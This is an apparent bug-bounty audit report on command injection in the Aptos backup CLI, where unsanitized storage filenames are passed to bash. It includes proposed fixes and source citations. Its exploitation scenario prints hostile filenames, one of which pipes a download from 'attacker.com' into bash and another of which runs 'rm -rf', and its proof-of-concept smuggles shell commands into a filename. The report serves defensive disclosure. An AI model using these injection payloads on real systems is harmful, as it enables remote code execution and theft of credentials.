# Audit Report

## Title
Command Injection in Backup Metadata File Operations via Unsanitized Filenames

## Summary
The `backup_metadata_file` method in the command adapter storage backend is vulnerable to command injection. When backup metadata files are moved to a backup folder, filenames extracted from storage are passed to bash commands without validation, allowing attackers with write access to backup storage to execute arbitrary code on nodes running backup compaction.

## Finding Description

The vulnerability exists in the backup CLI's command adapter implementation. The system has two distinct issues:

**Issue 1 (DoS - Lower Severity):** When `backup_metadata_file` is `None`, calling the method causes a panic. [1](#0-0) [2](#0-1) 

**Issue 2 (Command Injection - High Severity):** The primary vulnerability is command injection through unsanitized filenames. The attack flow is:

1. **Filename Extraction Without Validation:** When `backup_metadata_file()` is called, it extracts the filename from the `file_handle` parameter using path manipulation, but applies **no validation**: [3](#0-2) 

2. **Unvalidated Type:** Unlike `ShellSafeName` which enforces strict alphanumeric validation, `FileHandle` is just a type alias for `String` with no sanitization: [4](#0-3) [5](#0-4) 

3. **Unsafe Environment Variable Usage:** The extracted filename is passed as `$FILE_NAME` to bash commands: [6](#0-5) [7](#0-6) 

4. **Bash Command Execution:** Commands are executed via `bash -c` with variable substitution: [8](#0-7) [9](#0-8) 

5. **Production Configuration Vulnerability:** Production configs use `$FILE_NAME` WITHOUT quotes: [10](#0-9) 

**Exploitation Scenario:**
- Attacker gains write access to backup storage (e.g., leaked GCS credentials, misconfigured bucket)
- Creates file: `metadata/test$(curl attacker.com|bash).meta` or `metadata/test;rm -rf /tmp/cache;.meta`
- When `list_metadata_files` runs, it returns this filename
- `backup_metadata_file` extracts `test$(curl attacker.com|bash).meta` 
- Command becomes: `gcloud storage mv gs://bucket/metadata/test$(curl attacker.com|bash).meta ...`
- Bash interprets the command substitution `$(...)` or command separator `;`, executing attacker's code

The file handles come from untrusted storage via `list_metadata_files`: [11](#0-10) 

And are used in the compaction workflow: [12](#0-11) 

## Impact Explanation

**Severity: High** - This meets the High severity criteria per Aptos bug bounty program:

1. **Arbitrary Code Execution:** Attacker gains full code execution on the backup compaction service
2. **Infrastructure Compromise:** The compaction runs as a Kubernetes CronJob with service account credentials: [13](#0-12) 

3. **Potential Escalation:** 
   - Exfiltrate backup data containing blockchain state
   - Steal cloud credentials from the service account
   - Pivot to other infrastructure components
   - Manipulate backup integrity

While this doesn't directly affect consensus or validator nodes, it compromises critical backup infrastructure that validators rely on for disaster recovery.

## Likelihood Explanation

**Likelihood: Medium**

**Attack Requirements:**
- Attacker needs write access to backup storage (S3/GCS/Azure)
- Backup compaction must be enabled and running periodically

**Realistic Attack Vectors:**
- Leaked cloud storage credentials (common in breaches)
- Misconfigured bucket permissions (public write access)
- Compromised CI/CD pipelines with storage access
- Insider threats with legitimate storage access

**Deployment Context:** Based on the Helm chart, this runs as a scheduled CronJob in production Aptos deployments, making it an active attack surface.

## Recommendation

**Immediate Fix:** Validate all filenames extracted from `file_handle` using `ShellSafeName` validation before passing them to shell commands:

```rust
async fn backup_metadata_file(&self, file_handle: &FileHandleRef) -> Result<()> {
    // extract the file name from the file_handle
    let name = Path::new(file_handle)
        .file_name()
        .and_then(OsStr::to_str)
        .ok_or_else(|| format_err!("cannot extract filename from {}", file_handle))?;
    
    // NEW: Validate filename is shell-safe
    let safe_name = ShellSafeName::from_str(name)
        .map_err(|e| format_err!("Unsafe filename in backup metadata: {} - {}", name, e))?;
    
    let child = self
        .cmd(
            self.config
                .commands
                .backup_metadata_file
                .as_ref()
                .expect("metadata backup command not defined !"),
            vec![EnvVar::file_name(safe_name.as_ref())],
        )
        .spawn()?;
    child.join().await?;
    Ok(())
}
```

**Additional Mitigations:**
1. **Quote Variables in Config:** Update all sample configs to quote `$FILE_NAME`:
   ```yaml
   backup_metadata_file: "gcloud storage mv \"gs://$BUCKET/$SUB_DIR/metadata/$FILE_NAME\" \"gs://$BUCKET/$SUB_DIR/metadata_backup/$FILE_NAME\""
   ```

2. **Handle None Case:** Replace `.expect()` with proper error handling to prevent DoS:
   ```rust
   let cmd = self.config
       .commands
       .backup_metadata_file
       .as_ref()
       .ok_or_else(|| format_err!("backup_metadata_file command not configured"))?;
   ```

3. **Input Validation at Source:** Validate filenames in `list_metadata_files` implementations

## Proof of Concept

Create a test file demonstrating the vulnerability:

```rust
#[cfg(test)]
mod command_injection_test {
    use super::*;
    use tempfile::TempDir;
    
    #[tokio::test]
    async fn test_backup_metadata_file_command_injection() {
        // Setup: Create config with vulnerable command
        let config_yaml = r#"
env_vars:
  - key: "BUCKET"
    value: "test-bucket"
commands:
  create_backup: "echo $BACKUP_NAME"
  create_for_write: "echo $FILE_NAME"
  open_for_read: "cat /dev/null"
  save_metadata_line: "echo $FILE_NAME"
  list_metadata_files: "echo 'metadata/test;touch /tmp/pwned;.meta'"
  backup_metadata_file: "echo 'Moving: $FILE_NAME' && touch /tmp/injected_$FILE_NAME"
"#;
        
        let config = CommandAdapterConfig::load_from_str(config_yaml).unwrap();
        let adapter = CommandAdapter::new(config);
        
        // Simulate malicious filename from storage
        let malicious_file = "metadata/test;touch /tmp/pwned;.meta";
        
        // This should fail with proper validation, but currently executes the injection
        let result = adapter.backup_metadata_file(malicious_file).await;
        
        // Check if injection occurred (file would be created by the injected command)
        // In a proper fix, this should return an error instead
        assert!(result.is_err(), "Should reject unsafe filename");
    }
}
```

**Manual Verification Steps:**
1. Deploy backup compaction with a test GCS bucket
2. Create file in bucket: `gsutil cp test.txt gs://bucket/metadata/'test;echo INJECTED>&2;.meta'`
3. Run backup compaction: `aptos-debugger aptos-db backup-maintenance compact ...`
4. Observe in logs that `INJECTED` appears, confirming command execution

**Notes**

This vulnerability represents a critical gap in input validation where the codebase correctly validates user-provided names via `ShellSafeName`, but fails to apply the same rigor to filenames retrieved from external storage. The assumption that storage-provided data is trustworthy is violated when attackers gain write access to backup buckets through credential leaks or misconfigurations—a common occurrence in cloud environments.

The fix requires treating all external inputs, including storage-provided filenames, with the same skepticism as user inputs, applying the existing `ShellSafeName` validation pattern consistently across the codebase.

### Citations

**File:** storage/backup/backup-cli/src/storage/command_adapter/config.rs (L24-26)
```rust
    pub fn file_name(value: &str) -> Self {
        Self::new("FILE_NAME".to_string(), value.to_string())
    }
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/config.rs (L71-71)
```rust
    pub backup_metadata_file: Option<String>,
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/mod.rs (L126-138)
```rust
    async fn list_metadata_files(&self) -> Result<Vec<FileHandle>> {
        let child = self
            .cmd(&self.config.commands.list_metadata_files, vec![])
            .spawn()?;

        let mut buf = FileHandle::new();
        child
            .into_data_source()
            .read_to_string(&mut buf)
            .await
            .err_notes((file!(), line!(), &buf))?;
        Ok(buf.lines().map(str::to_string).collect())
    }
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/mod.rs (L142-147)
```rust
    async fn backup_metadata_file(&self, file_handle: &FileHandleRef) -> Result<()> {
        // extract the file name from the file_handle
        let name = Path::new(file_handle)
            .file_name()
            .and_then(OsStr::to_str)
            .ok_or_else(|| format_err!("cannot extract filename from {}", file_handle))?;
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/mod.rs (L148-157)
```rust
        let child = self
            .cmd(
                self.config
                    .commands
                    .backup_metadata_file
                    .as_ref()
                    .expect("metadata backup command not defined !"),
                vec![EnvVar::file_name(name)],
            )
            .spawn()?;
```

**File:** storage/backup/backup-cli/src/storage/mod.rs (L40-41)
```rust
pub type FileHandle = String;
pub type FileHandleRef = str;
```

**File:** storage/backup/backup-cli/src/storage/mod.rs (L51-58)
```rust
impl ShellSafeName {
    const PATTERN: &'static str = r"\A[a-zA-Z0-9][a-zA-Z0-9._-]{2,126}\z";

    fn sanitize(name: &str) -> Result<()> {
        static RE: Lazy<Regex> = Lazy::new(|| Regex::new(ShellSafeName::PATTERN).unwrap());
        ensure!(RE.is_match(name), "Illegal name: {}", name,);
        Ok(())
    }
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/command.rs (L30-36)
```rust
impl Command {
    pub fn new(raw_cmd: &str, param_env_vars: Vec<EnvVar>, config_env_vars: Vec<EnvVar>) -> Self {
        Self {
            cmd_str: format!("set -o nounset -o errexit -o pipefail; {}", raw_cmd),
            param_env_vars,
            config_env_vars,
        }
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/command.rs (L65-79)
```rust
    pub fn spawn(command: Command) -> Result<Self> {
        debug!("Spawning {:?}", command);

        let mut cmd = tokio::process::Command::new("bash");
        cmd.args(["-c", &command.cmd_str]);
        cmd.stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::inherit());
        for v in command
            .config_env_vars
            .iter()
            .chain(command.param_env_vars.iter())
        {
            cmd.env(&v.key, &v.value);
        }
```

**File:** terraform/helm/fullnode/files/backup/gcs.yaml (L31-31)
```yaml
  backup_metadata_file: "gcloud storage mv gs://$BUCKET/$SUB_DIR/metadata/$FILE_NAME gs://$BUCKET/$SUB_DIR/metadata_backup/$FILE_NAME"
```

**File:** storage/backup/backup-cli/src/coordinators/backup.rs (L454-467)
```rust
        for file in to_move {
            info!(file = file, "Backup metadata file.");
            self.storage
                .backup_metadata_file(&file)
                .await
                .map_err(|err| {
                    error!(
                        file = file,
                        error = %err,
                        "Backup metadata file failed, ignoring.",
                    )
                })
                .ok();
        }
```

**File:** terraform/helm/fullnode/templates/backup-compaction.yaml (L30-52)
```yaml
          - name: backup-compaction
            {{- if and $backup_compaction_cronjob (not $.Values.manageImages) }} # if the statefulset already exists and we do not want helm to simply overwrite the image, use the existing image
            image: {{ (first $backup_compaction_cronjob.spec.jobTemplate.spec.template.spec.containers).image }}
            {{- else }}
            image: {{ .Values.backup.image.repo }}:{{ .Values.backup.image.tag | default .Values.imageTag }}
            {{- end }}
            imagePullPolicy: {{ .Values.backup.image.pullPolicy }}
            command:
            - /usr/local/bin/aptos-debugger
            - aptos-db
            - backup-maintenance
            - compact
            - --state-snapshot-file-compact-factor
            - "100"
            - --transaction-file-compact-factor
            - "100"
            - --epoch-ending-file-compact-factor
            - "100"
            - --metadata-cache-dir
            - /tmp/aptos-backup-compaction-metadata
            - --command-adapter-config
            # use the same config with the backup sts
            - /opt/aptos/etc/{{ .Values.backup.config.location }}.yaml
```
